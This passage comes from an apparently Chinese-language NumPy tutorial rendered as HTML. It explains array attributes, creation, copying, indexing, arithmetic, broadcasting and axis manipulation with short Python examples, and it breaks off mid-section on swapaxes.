id="axes"><a class="markdownIt-Anchor" href="#axes"></a> axes</h4><ul><li>在NumPy中，不同的维度称为轴(axes)。</li></ul><p><code>[[0., 0., 0.], [1., 1., 1.]]</code></p><ul><li>该数组有2个轴。第一轴的长度为2，第二轴的长度为3。</li><li>在二维NumPy数组中，轴是沿行和列的方向。 axis=0，表示沿着第 0 轴（行的方向）进行操作；axis=1，表示沿着第1轴进行操作。</li></ul><h4 id="rank"><a class="markdownIt-Anchor" href="#rank"></a> rank</h4><ul><li>NumPy 数组的维数称为秩（rank），秩就是轴的数量，即数组的维度，一维数组的秩为 1，二维数组的秩为 2</li></ul><h4 id="dimensions"><a class="markdownIt-Anchor" href="#dimensions"></a> dimensions</h4><ul><li>在 NumPy中，每一个线性的数组称为是一个轴（axis），也就是维度（dimensions）。比如说，二维数组相当于是两个一维数组，其中第一个一维数组中每个元素又是一个一维数组。所以一维数组就是 NumPy 中的轴（axis），第一个轴相当于是底层数组，第二个轴是底层数组里的数组。而轴的数量——秩，就是数组的维数。</li></ul><h4 id="itemsize"><a class="markdownIt-Anchor" href="#itemsize"></a> itemsize</h4><ul><li>ndarray.itemsize 以字节的形式返回数组中每一个元素的大小。</li><li>例如，一个元素类型为 float64 的数组 itemsize 属性值为 8(float64 占用 64 个 bits，每个字节长度为 8，所以 64/8，占用 8 个字节）;</li><li>又如，一个元素类型为 complex32 的数组 itemsize 属性值为 4（32/8）。</li></ul><h4 id="flags"><a class="markdownIt-Anchor" href="#flags"></a> flags</h4><ul><li>ndarray.flags 返回 ndarray 对象的内存信息，包含以下属性：</li></ul><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>C_CONTIGUOUS ©</td><td>数据是在一个单一的C风格的连续段中</td></tr><tr><td>F_CONTIGUOUS (F)</td><td>数据是在一个单一的Fortran风格的连续段中</td></tr><tr><td>OWNDATA (O)</td><td>数组拥有它所使用的内存或从另一个对象中借用它</td></tr><tr><td>WRITEABLE (W)</td><td>数据区域可以被写入，将该值设置为 False，则数据为只读</td></tr><tr><td>ALIGNED (A)</td><td>数据和所有元素都适当地对齐到硬件上</td></tr><tr><td>UPDATEIFCOPY (U)</td><td>这个数组是其它数组的一个副本，当这个数组被释放时，原数组的内容将被更新</td></tr></tbody></table><h1 id="numpymat类"><a class="markdownIt-Anchor" href="#numpymat类"></a> numpy.mat类</h1><ul><li>Numpy中有“真正的”矩阵(Matrix)。 它们是二维数组的子集。 我们可以通过应用mat函数将一个二维数组转换为一个矩阵。</li><li>与Numpy的二维数组主要区别在于将两个二维数组或两个矩阵相乘时，两个矩阵相乘得到真正的乘法，但二维数组相乘只是逐元素相乘</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">A = np.array([ [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>] ])</span><br><span class="line">B = np.array([ [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">-1</span>, <span class="number">-2</span>, <span class="number">-3</span>] ])</span><br><span class="line">MA = np.mat(A)</span><br><span class="line">MB = np.mat(B)</span><br><span class="line">MA*MB</span><br></pre></td></tr></table></figure><h1 id="数组"><a class="markdownIt-Anchor" href="#数组"></a> 数组</h1><h2 id="创建"><a class="markdownIt-Anchor" href="#创建"></a> 创建</h2><h3 id="nparray"><a class="markdownIt-Anchor" href="#nparray"></a> np.array()</h3><ul><li><p>自定义数组，简单数组所需要做的就是将列表传递给它，使用dtype关键字明确指定要使用的数据类型。</p></li><li><p><code>a = np.array([1, 2, 3], dtype=np.int64)</code></p></li><li><p>创建标量42。将ndim方法应用于标量，得到数组的维度为0</p></li><li><p><code>x = np.array(42)</code></p></li></ul><h3 id="npones"><a class="markdownIt-Anchor" href="#npones"></a> np.ones()</h3><ul><li><p>全1向量</p></li><li><p><code>x = np.ones(2) # [1.,1.]</code></p></li><li><p>全1数组</p></li><li><p><code>x = np.ones((1,1))</code></p></li></ul><h3 id="npzeros"><a class="markdownIt-Anchor" href="#npzeros"></a> np.zeros()</h3><ul><li><p>全0向量</p></li><li><p><code>x = np.zeros(2) # [1.,1.]</code></p></li><li><p>全0数组</p></li><li><p><code>x = np.zeros((1,1))</code></p></li></ul><h3 id="npones_like-npzeros_like"><a class="markdownIt-Anchor" href="#npones_like-npzeros_like"></a> np.ones_like() np.zeros_like()</h3><ul><li>产生的数组与另一个现有数组具有相同的形状</li><li><code>x = np.array([2,5,18,14,4])</code></li><li><code>E = np.ones_like(x)</code></li><li><code>Z = np.zeros_like(x)</code></li></ul><h3 id="npempty"><a class="markdownIt-Anchor" href="#npempty"></a> np.empty()</h3><ul><li>创建并返回对给定形状和类型的新数组的引用，而不初始化元素，注意通常它们是任意值。</li><li><code>np.empty((2, 4))</code></li></ul><h3 id="nparange"><a class="markdownIt-Anchor" href="#nparange"></a> np.arange()</h3><ul><li><code>arange([start,] stop[, step], [, dtype=None])</code></li><li><code>np.arange(1, 10)</code></li><li>在给定间隔内返回均匀间隔的值</li><li>返回数组是半开区间[start，stop）内生成的，如果未给出start参数，则将其设置为0。</li><li>间隔的结束由参数stop确定。通常，间隔不包括此值，除非在某些情况下step不是整数，浮点舍入会影响输出ndarray的长度。</li><li>使用可选参数step设置输出数组的两个相邻值之间的间距。 step的默认值是1。如果给出参数step，start参数不能是可选的，即它也必须给出。</li><li>可以使用参数dtype指定输出数组的类型。如果未给出，则将从其他输入参数自动推断类型。</li></ul><h3 id="nplinspace"><a class="markdownIt-Anchor" href="#nplinspace"></a> np.linspace()</h3><ul><li><p><code>linspace(start, stop, num=50, endpoint=True, retstep=False)</code></p></li><li><p>linspace返回一个ndarray，由闭区间[start，stop]或半开区间[start，stop]中的num个等间隔样本组成。返回闭或半开间隔，则取决于endpoint是True还是False。</p></li><li><p>参数start定义将要创建的序列的起始值。</p></li><li><p>stop将是序列的结束值，除非endpoint设置为False。 在后一种情况下，得到的序列将由除num+1个样本外的均匀间隔的样本组成。 这意味着排除stop。</p></li><li><p>请注意，当endpoint为False时，步长会发生变化。</p></li><li><p>可以使用num设置要生成的样本数，默认为50。如果可选参数endpoint设置为True（默认值），stop将是序列的最后一个样本。 否则，它不包括在内。</p></li><li><p>如果设置了可选参数retstep，则该函数还将返回相邻值之间的间距值。 因此，该函数将返回一个元组(‘samples’, ‘step’)：</p></li><li><p><code>samples, spacing = np.linspace(1, 10, 20, endpoint=True, retstep=True)</code></p></li></ul><h3 id="npidentity"><a class="markdownIt-Anchor" href="#npidentity"></a> np.identity()</h3><ul><li>单位方阵<code>identity(n, dtype=None)</code>，输出是nxn数组，其主对角线设置为1，所有其他元素为0<ul><li>n：一个整数，用于定义输出的行数和列数，即nxn</li><li>dtype：一个可选参数，用于定义输出的数据类型。 默认为float</li></ul></li></ul><h3 id="npeye"><a class="markdownIt-Anchor" href="#npeye"></a> np.eye()</h3><ul><li>创建仅由1组成的对角线数组<code>eye(N, M=None, k=0, dtype=float)</code>，返回一个形状的(N，M)的ndarray。 除了第k个对角线为1之外，该数组的所有元素都等于零。<ul><li>N定义输出数组行的整数。</li><li>M一个可选的整数，用于设置输出中的列数。 如果为None，则默认为“N”。</li><li>k定义对角线的位置。 默认值为0。0表示主对角线。 正值表示上对角线，负值表示下对角线。</li><li>dtype返回数组的可选数据类型。</li></ul></li></ul><h2 id="复制"><a class="markdownIt-Anchor" href="#复制"></a> 复制</h2><h3 id="npcopy"><a class="markdownIt-Anchor" href="#npcopy"></a> np.copy()</h3><ul><li><p>返回给定对象obj的数组拷贝<code>copy(obj, order='K')</code></p><ul><li>obj：array_like输入数据。</li><li>order：可能的值是{‘C’，‘F’，‘A’，‘K’}。 此参数控制拷贝的内存布局。<ul><li>'C’表示C顺序，</li><li>'F’表示Fortran顺序：Fortran数组是列优先的。</li></ul></li><li>如果对象obj是Fortran连续的’A’表示’F’，否则表示’C’。 'K’表示尽可能匹配obj的布局。</li></ul></li><li><p><code>x = np.array([[42],[44]], order='F')</code></p></li><li><p><code>y = np.copy(x)</code></p></li></ul><h3 id="ndarraycopy"><a class="markdownIt-Anchor" href="#ndarraycopy"></a> ndarray.copy()</h3><ul><li>它与np.copy()类似，但顺序参数的默认值不同<code>a.copy(order='C')</code></li></ul><h3 id="浅拷贝"><a class="markdownIt-Anchor" href="#浅拷贝"></a> 浅拷贝</h3><ul><li><code>a = np.arange(12)</code></li><li><code>b = a</code></li><li>a b只是变量名不同，指向内容相同</li></ul><h3 id="视图"><a class="markdownIt-Anchor" href="#视图"></a> 视图</h3><ul><li><code>c = a.view()</code></li><li>创建一个新的数组对象，共享相同的数据，改变shape不会相互影响，而修改数据则会直接反馈到原始对象</li><li>c.flags.owndata是false</li></ul><h2 id="访问"><a class="markdownIt-Anchor" href="#访问"></a> 访问</h2><h3 id="索引"><a class="markdownIt-Anchor" href="#索引"></a> 索引</h3><ul><li>一维数组</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line">print(data[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><ul><li>多维数组</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">A = np.array([ [<span class="number">3.4</span>, <span class="number">8.7</span>, <span class="number">9.9</span>], </span><br><span class="line">               [<span class="number">1.1</span>, <span class="number">-7.8</span>, <span class="number">-0.7</span>],</span><br><span class="line">               [<span class="number">4.1</span>, <span class="number">12.3</span>, <span class="number">4.8</span>]])</span><br><span class="line">print(A[<span class="number">1</span>][<span class="number">0</span>]) <span class="comment"># 低效，因为创建了中间数组A[1]</span></span><br><span class="line">print(A[<span class="number">1</span>, <span class="number">0</span>])</span><br></pre></td></tr></table></figure><h3 id="切片"><a class="markdownIt-Anchor" href="#切片"></a> 切片</h3><ul><li>python在列表和元组上的切片会创建新对象，但对ndarray数组执行切片操作会在原始数组上创建一个视图(view)。 如果我们修改一个视图，原始数组也将被修改。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">A = np.array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>])</span><br><span class="line">S = A[<span class="number">2</span>:<span class="number">6</span>]</span><br></pre></td></tr></table></figure><ul><li>多维数组</li><li>如果选择元组中的对象数目小于维N，则对于任何后续维度的假定是’:’</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = np.arange(<span class="number">40</span>).reshape(<span class="number">5</span>, <span class="number">8</span>)</span><br><span class="line">a[:<span class="number">3</span>, :<span class="number">5</span>]</span><br><span class="line">a[<span class="number">1</span>::<span class="number">2</span>, ::<span class="number">3</span>]</span><br></pre></td></tr></table></figure><h3 id="高级索引"><a class="markdownIt-Anchor" href="#高级索引"></a> 高级索引</h3><h4 id="布尔数组"><a class="markdownIt-Anchor" href="#布尔数组"></a> 布尔数组</h4><ul><li>测试数组A的每个元素， 看其是否等于4。这些测试的结果是结果数组的布尔元素。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">A = np.array([<span class="number">4</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>])</span><br><span class="line">print(A == <span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[ <span class="literal">True</span> <span class="literal">False</span> <span class="literal">False</span>  <span class="literal">True</span> <span class="literal">False</span> <span class="literal">False</span>]</span><br></pre></td></tr></table></figure><ul><li>这对图像进行阈值非常方便</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">A = np.array([</span><br><span class="line">[<span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">10</span>,  <span class="number">9</span>],</span><br><span class="line">[<span class="number">10</span>, <span class="number">16</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">11</span>]])</span><br><span class="line">B = A &lt; <span class="number">15</span></span><br><span class="line">B.astype(np.int)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>array([[<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">       [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]])</span><br></pre></td></tr></table></figure><h4 id="花式索引"><a class="markdownIt-Anchor" href="#花式索引"></a> 花式索引</h4><ul><li>用布尔数组或整数数组(掩码，mask)对数组进行索引，则称为花式索引。 结果将是一个拷贝(副本)而不是一个视图。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">C = np.array([<span class="number">123</span>,<span class="number">188</span>,<span class="number">190</span>,<span class="number">99</span>,<span class="number">77</span>,<span class="number">88</span>,<span class="number">100</span>])</span><br><span class="line">A = np.array([<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">5</span>])</span><br><span class="line">R = C[A&lt;=<span class="number">5</span>]</span><br><span class="line">print(R)</span><br></pre></td></tr></table></figure><h4 id="整数数组索引"><a class="markdownIt-Anchor" href="#整数数组索引"></a> 整数数组索引</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">C[[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>array([<span class="number">123</span>,<span class="number">190</span>,<span class="number">99</span>,<span class="number">188</span>,<span class="number">77</span>,<span class="number">188</span>])</span><br></pre></td></tr></table></figure><ul><li>多维索引</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = np.arange(<span class="number">40</span>).reshape(<span class="number">5</span>, <span class="number">8</span>)</span><br><span class="line">a[(<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>), (<span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">4</span>)]</span><br></pre></td></tr></table></figure><h4 id="npnonzero-ndarraynonzero"><a class="markdownIt-Anchor" href="#npnonzero-ndarraynonzero"></a> np.nonzero() ndarray.nonzero()</h4><ul><li>以数组的元组形式返回非零的a元素的索引</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a[a.nonzero()]</span><br><span class="line">np.nonzero(a &gt;= <span class="number">42</span>)</span><br></pre></td></tr></table></figure><h4 id="npwhere"><a class="markdownIt-Anchor" href="#npwhere"></a> np.where()</h4><ul><li><code>np.where(condition, x, y)</code>满足条件(condition)，输出x，不满足输出y。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = np.arange(<span class="number">10</span>)</span><br><span class="line">np.where(a &gt; <span class="number">5</span>,<span class="number">1</span>,<span class="number">-1</span>)</span><br><span class="line">np.where([[<span class="literal">True</span>,<span class="literal">False</span>], [<span class="literal">True</span>,<span class="literal">True</span>]],</span><br><span class="line">[[<span class="number">1</span>,<span class="number">2</span>], [<span class="number">3</span>,<span class="number">4</span>]],[[<span class="number">9</span>,<span class="number">8</span>], [<span class="number">7</span>,<span class="number">6</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>array([<span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>,  <span class="number">1</span>,  <span class="number">1</span>,  <span class="number">1</span>,  <span class="number">1</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>array([[<span class="number">1</span>, <span class="number">8</span>],[<span class="number">3</span>, <span class="number">4</span>]]</span><br></pre></td></tr></table></figure><ul><li><p>上面这个例子的条件为[[True,False], [True,False]]，分别对应最后输出结果的四个值。第一个值从[1,9]中选，因为条件为True，所以是选1。第二个值从[2,8]中选，因为条件为False</p></li><li><p><code>np.where(condition)</code>只有条件 (condition)，没有x和y，则输出满足条件 (即非0) 元素的坐标 (等价于numpy.nonzero)</p></li></ul><h2 id="运算"><a class="markdownIt-Anchor" href="#运算"></a> 运算</h2><h3 id="加减乘除"><a class="markdownIt-Anchor" href="#加减乘除"></a> 加减乘除</h3><h4 id="标量"><a class="markdownIt-Anchor" href="#标量"></a> 标量</h4><ul><li>标量运算将作用到每个元素中</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v = np.array([<span class="number">2</span>,<span class="number">3</span>, <span class="number">7.9</span>, <span class="number">3.3</span>, <span class="number">6.9</span>, <span class="number">0.11</span>, <span class="number">10.3</span>, <span class="number">12.9</span>])</span><br><span class="line">v = v + <span class="number">2</span></span><br><span class="line">v * <span class="number">2.2</span></span><br><span class="line">v - <span class="number">1.38</span></span><br><span class="line">v ** <span class="number">2</span></span><br></pre></td></tr></table></figure><h4 id="数组间"><a class="markdownIt-Anchor" href="#数组间"></a> 数组间</h4><ul><li>如果有两个相同大小的矩阵，两个数组间操作，则将按逐元素方式组合，所以A * B不应该被误认为是矩阵乘法。 这些元素只是逐元素相乘。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = np.array([<span class="number">1</span>, <span class="number">2</span>])</span><br><span class="line">ones = np.ones(<span class="number">2</span>, dtype=int)</span><br><span class="line">data + ones</span><br></pre></td></tr></table></figure><h3 id="点积"><a class="markdownIt-Anchor" href="#点积"></a> 点积</h3><h4 id="npdot"><a class="markdownIt-Anchor" href="#npdot"></a> np.dot()</h4><ul><li><code>dot(a, b, out=None)</code></li><li>要求a的最后一个维度的形状与b的倒数第二个维度的形状的相同，即要求a.shape[-1] == b.shape[-2]，否则会引发ValueError</li></ul><h3 id="比较"><a class="markdownIt-Anchor" href="#比较"></a> 比较</h3><ul><li>比较两个数组，比较是按元素进行的，返回一个布尔数组</li></ul><h4 id="nparray_equal"><a class="markdownIt-Anchor" href="#nparray_equal"></a> np.array_equal()</h4><ul><li>比较数组是否完整的相等，具有相同的形状和相同的元素。我们使用array_equal来实现此目的。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">np.array_equal(A, B)</span><br></pre></td></tr></table></figure><h3 id="逻辑"><a class="markdownIt-Anchor" href="#逻辑"></a> 逻辑</h3><h4 id="nplogical_or"><a class="markdownIt-Anchor" href="#nplogical_or"></a> np.logical_or()</h4><h4 id="nplogical_and"><a class="markdownIt-Anchor" href="#nplogical_and"></a> np.logical_and()</h4><h2 id="操作"><a class="markdownIt-Anchor" href="#操作"></a> 操作</h2><h3 id="展平数组"><a class="markdownIt-Anchor" href="#展平数组"></a> 展平数组</h3><h4 id="ndarrayflatten"><a class="markdownIt-Anchor" href="#ndarrayflatten"></a> ndarray.flatten()</h4><ul><li><code>ndarray.flatten([order='C'])</code></li><li>order可以具有值“ C”、“ F”、“A”和“K”。 默认顺序为“C”。<ul><li>“C”表示C-style按row-major ordering(行主顺序）展平，即最右边的索引更改最快，换句话说：按行主顺序，行索引变化最慢，列索引变化最快，因此 a[0,0]接着的是a[0,1]。</li><li>“F”代表Fortran-style的列主顺序。</li><li>“A”表示如果数组在内存中是连续的，则按列优先顺序进行展平；否则，按行优先进行展平。</li><li>“K”表示按数组元素在内存中出现的顺序展平。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = np.arange(<span class="number">24</span>).reshape((<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>))</span><br><span class="line">a.flatten()    <span class="comment"># [ 0  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23]</span></span><br><span class="line">a.flatten(<span class="string">&#x27;F&#x27;</span>) <span class="comment"># [ 0  8 16  2 10 18  4 12 20  6 14 22  1  9 17  3 11 19  5 13 21  7 15 23]</span></span><br><span class="line">a.flatten(<span class="string">&#x27;C&#x27;</span>) <span class="comment"># [ 0  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23]</span></span><br><span class="line">a.flatten(<span class="string">&#x27;K&#x27;</span>) <span class="comment"># [ 0  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23]</span></span><br><span class="line">a.flatten(<span class="string">&#x27;A&#x27;</span>) <span class="comment"># [ 0  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23]</span></span><br></pre></td></tr></table></figure><h4 id="ndarrayravel"><a class="markdownIt-Anchor" href="#ndarrayravel"></a> ndarray.ravel()</h4><ul><li><code>ravel(a, order='C')</code>仅返回原始数组的reference/view，flatten返回原始数组的副本</li><li>等价于<code>reshape(-1, order=order)</code></li><li>ravel是库级别的函数，因此可以在任何可以成功解析的对象上调用。flatten是ndarray对象的方法，所以ravel将在ndarray列表上工作，而flatten不适用于该类型的对象。</li><li>ravel比flatten()更快，因为它不占用任何内存。</li></ul><h3 id="reshape"><a class="markdownIt-Anchor" href="#reshape"></a> reshape</h3><ul><li><code>reshape(a, newshape, order='C')</code>在不更改数据的情况下为一个数组提供了新的形状，即返回具有新形状的一个视图。</li></ul><h3 id="更改维度"><a class="markdownIt-Anchor" href="#更改维度"></a> 更改维度</h3><h4 id="npnewaxis"><a class="markdownIt-Anchor" href="#npnewaxis"></a> np.newaxis()</h4><ul><li>用于创建长度为1的轴。 newaxis是None的别名，可以用None代替它，结果相同</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])  <span class="comment">#           (5,)</span></span><br><span class="line">a1 = a[:, np.newaxis] <span class="comment"># [[1][2][3][4][5]]  (5, 1)</span></span><br><span class="line">a2 = a[np.newaxis, :] <span class="comment"># [[1 2 3 4 5]]      (1, 5)</span></span><br><span class="line">b = np.arange(<span class="number">25</span>).reshape(<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">b_5D = b[np.newaxis, ..., np.newaxis, np.newaxis]  <span class="comment"># (1, 5, 5, 1, 1)</span></span><br></pre></td></tr></table></figure><h4 id="npexpand_dims"><a class="markdownIt-Anchor" href="#npexpand_dims"></a> np.expand_dims()</h4><ul><li>扩展数组的形状，可以插入一个新的轴，该轴出现在扩展数组形状的轴位置上。</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = np.array([<span class="number">2</span>, <span class="number">4</span>])           <span class="comment"># (2,)</span></span><br><span class="line">b = np.expand_dims(a, axis=<span class="number">0</span>)  <span class="comment"># (1, 2)</span></span><br><span class="line">b = np.expand_dims(a, axis=<span class="number">1</span>)  <span class="comment"># (2, 1)</span></span><br></pre></td></tr></table></figure><h4 id="npsqueeze"><a class="markdownIt-Anchor" href="#npsqueeze"></a> np.squeeze()</h4><ul><li>从一个数组的形状中去除一维条目。</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">x = np.array([[[<span class="number">0</span>], [<span class="number">1</span>], [<span class="number">2</span>]]])  <span class="comment"># (1, 3, 1)</span></span><br><span class="line">y = np.squeeze(x)                <span class="comment"># (3)</span></span><br><span class="line">y = np.squeeze(x, axis=<span class="number">0</span>)        <span class="comment"># (3, 1)</span></span><br><span class="line">y = np.squeeze(x, axis=<span class="number">1</span>)        <span class="comment"># error 1轴有值，无法压缩</span></span><br><span class="line">y = np.squeeze(x, axis=<span class="number">2</span>)        <span class="comment"># (1, 3)</span></span><br></pre></td></tr></table></figure><h3 id="广播"><a class="markdownIt-Anchor" href="#广播"></a> 广播</h3><ul><li>前面数组运算包含了标量和大小相同数组间的加减乘除，对于不同的形状的两个数组，Numpy提供了一种称为广播（Broadcasting）的强大机制进行算数运算。</li><li>这意味着我们有一个较小的数组和一个较大的数组，我们多次转换或应用较小的数组，以对较大的数组执行某些操作。 换句话说：在某些条件下，较小的数组被“广播”成与较大数组具有相同的形状。借助广播，我们可以避免Python程序中的循环。 循环在Numpy实现中隐式发生。还可以避免了创建不必要的数据副本。</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">data = np.array([<span class="number">1.0</span>, <span class="number">2.0</span>])</span><br><span class="line">data * <span class="number">1.6</span> <span class="comment"># array([1.6, 3.2])</span></span><br></pre></td></tr></table></figure><ul><li>对不同大小的矩阵执行这些算术运算，但前提是一个矩阵只有一列或一行。在这种情况下，NumPy将使用其广播规则进行操作。</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">data = np.array([[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>], [<span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line">ones_row = np.array([[<span class="number">1</span>, <span class="number">1</span>]])</span><br><span class="line">data + ones_row  <span class="comment"># array([[2, 3],[4, 5],[6, 7]])</span></span><br></pre></td></tr></table></figure><ul><li>举例：距离矩阵 (Distance Matrix)</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">dist2barcelona = [<span class="number">0</span>,  <span class="number">1498</span>, <span class="number">1063</span>, <span class="number">1968</span>,<span class="number">1498</span>, <span class="number">1758</span>, <span class="number">1469</span>, <span class="number">1472</span>, <span class="number">2230</span>, <span class="number">2391</span>, <span class="number">1138</span>, <span class="number">505</span>, <span class="number">725</span>, <span class="number">3007</span>, <span class="number">1055</span>, <span class="number">833</span>, <span class="number">1354</span>, <span class="number">857</span>, <span class="number">2813</span>, <span class="number">2277</span>, <span class="number">1347</span>, <span class="number">1862</span>]</span><br><span class="line">dists =  np.array(dist2barcelona[:<span class="number">12</span>])</span><br><span class="line">print(np.abs(dists - dists[:, np.newaxis]))</span><br></pre></td></tr></table></figure><h3 id="tile"><a class="markdownIt-Anchor" href="#tile"></a> tile</h3><ul><li>重复模式 (Repeating Patterns)，重复现有矩阵多次来创建具有不同形状甚至维度的新矩阵。</li><li><code>tile(A, reps)</code></li><li>通过把A重复reps次数来构造一个数组。reps通常是一个元组（或列表），用于定义沿相应轴/方向的重复次数。</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">x = np.array([ [<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]])</span><br><span class="line">np.tile(x, (<span class="number">3</span>,<span class="number">4</span>)) <span class="comment"># array([[1, 2, 1, 2, 1, 2, 1, 2],[3, 4, 3, 4, 3, 4, 3, 4],[1, 2, 1, 2, 1, 2, 1, 2],[3, 4, 3, 4, 3, 4, 3, 4],[1, 2, 1, 2, 1, 2, 1, 2],[3, 4, 3, 4, 3, 4, 3, 4]])</span></span><br></pre></td></tr></table></figure><ul><li>如果我们坚持以元组或列表形式写reps，或者将reps = 5表示为reps = (5,)的缩写，则以下内容是正确的：<ul><li>如果reps的长度为n，则结果数组的维数将为n和A.ndim的最大值。</li><li>如果A.ndim &lt; n，则通过添加新轴将A提升为n维。 因此，将形状(5,)数组提升为(1, 5) 以进行2D复制，或将形状(1, 1, 5)提升为3D复制。</li><li>如果A.ndim &gt; d，则将reps前置1提升为’A’.ndim。</li></ul></li><li>因此，对于形状为(2, 3, 4, 5)的数组“ A”，一个(2, 2)的“ reps”被视为(1, 1, 2, 2)。</li></ul><h3 id="转置"><a class="markdownIt-Anchor" href="#转置"></a> 转置</h3><h4 id="transpose"><a class="markdownIt-Anchor" href="#transpose"></a> transpose</h4><h4 id="ndarrayt"><a class="markdownIt-Anchor" href="#ndarrayt"></a> ndarray.T</h4><h4 id="rollaxis"><a class="markdownIt-Anchor" href="#rollaxis"></a> rollaxis</h4><ul><li><code>numpy.rollaxis(arr, axis, start)</code></li><li>此函数使指定的轴滚动，直到它位于指定的位置。 该函数具有三个参数。<ul><li>arr：输入数组</li><li>axis：滚动的轴。 其他轴的位置相对彼此不变</li><li>start：默认为0来完成整个滚动。 滚动直到到达指定位置</li></ul></li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = np.arange(<span class="number">8</span>).reshape(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>) <span class="comment"># [[[0 1][2 3]][[4 5][6 7]]]</span></span><br><span class="line">b = np.rollaxis(a,<span class="number">2</span>)   <span class="comment"># [[[0 2][4 6]][[1 3][5 7]]]</span></span><br><span class="line">b = np.rollaxis(a,<span class="number">2</span>,<span class="number">1</span>) <span class="comment"># [[[0 2][1 3]][[4 6][5 7]]]</span></span><br></pre></td></tr></table></figure><ul><li>程序运行np.rollaxis(a, 2)时, 将轴2滚动到了轴0前面,数组下标排序由0,1,2变成了1,2,0。其他轴相对2轴位置不变(start默认0)。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0(000)-&gt;0(000)  1(001)-&gt;2(010)</span><br><span class="line">2(010)-&gt;4(100)  3(011)-&gt;6(110)</span><br><span class="line">4(100)-&gt;1(001)  5(101)-&gt;3(011)</span><br><span class="line">6(110)-&gt;5(101)  7(111)-&gt;7(111)</span><br></pre></td></tr></table></figure><ul><li>程序运行np.rollaxis(a, 2, 1)时,将轴2滚动到了轴1前面,数组下标排序由0,1,2变成了0,2,1。</li></ul><h4 id="swapaxes"><a class="markdownIt-Anchor" href="#swapaxes"></a> swapaxes</h4><ul><li><code>numpy.swapaxes(arr, axis1, 